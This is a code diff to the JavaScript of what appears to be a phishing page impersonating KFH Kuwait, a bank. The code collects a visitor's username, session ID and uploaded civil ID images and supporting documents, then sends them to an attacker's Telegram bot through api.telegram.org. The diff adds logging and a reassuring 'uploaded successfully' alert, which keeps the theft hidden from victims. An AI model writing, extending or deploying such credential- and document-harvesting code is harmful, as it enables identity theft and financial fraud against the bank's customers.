@@ -381,6 +381,11 @@
             const username = sessionStorage.getItem('kfh_username') || 'Unknown';
             const sessionId = sessionStorage.getItem('kfh_session_id') || 'session_' + Math.random().toString(36).substr(2, 9);
             
+            console.log('Starting document upload...');
+            console.log('ID Front Data:', sessionStorage.getItem('id-front_data') ? 'Exists' : 'Missing');
+            console.log('ID Back Data:', sessionStorage.getItem('id-back_data') ? 'Exists' : 'Missing');
+            console.log('Supporting Doc Data:', sessionStorage.getItem('supporting-doc_data') ? 'Exists' : 'Missing');
+            
             // Send notification message first
             let message = '📄 *KFH KUWAIT - Documents Uploaded*\n\n';
             message += '*🆔 Session ID:* ' + sessionId + '\n';
@@ -393,7 +398,7 @@
 
             try {
                 // Send message first
-                await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                const msgResult = await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
@@ -402,28 +407,35 @@
                         parse_mode: 'Markdown'
                     })
                 });
+                
+                console.log('Message sent:', msgResult.ok);
 
                 // Send ID Front document if exists
                 const idFrontData = sessionStorage.getItem('id-front_data');
                 if (idFrontData) {
+                    console.log('Sending ID Front...');
                     await sendDocumentToBot(botToken, chatId, idFrontData, sessionStorage.getItem('id-front_name'), '🪪 ID Front - ' + (sessionStorage.getItem('idType') || 'Civil ID'));
                 }
 
                 // Send ID Back document if exists
                 const idBackData = sessionStorage.getItem('id-back_data');
                 if (idBackData) {
+                    console.log('Sending ID Back...');
                     await sendDocumentToBot(botToken, chatId, idBackData, sessionStorage.getItem('id-back_name'), '🪪 ID Back - ' + (sessionStorage.getItem('idType') || 'Civil ID'));
                 }
 
                 // Send Supporting document if exists
                 const supportingData = sessionStorage.getItem('supporting-doc_data');
                 if (supportingData) {
+                    console.log('Sending Supporting Document...');
                     await sendDocumentToBot(botToken, chatId, supportingData, sessionStorage.getItem('supporting-doc_name'), '📎 Supporting Document');
                 }
 
                 console.log('All documents sent to bot successfully');
+                alert('Documents uploaded successfully!');
             } catch (err) {
                 console.log('Bot notification error:', err);
+                alert('Error uploading documents. Please try again.');
             }
         }
 
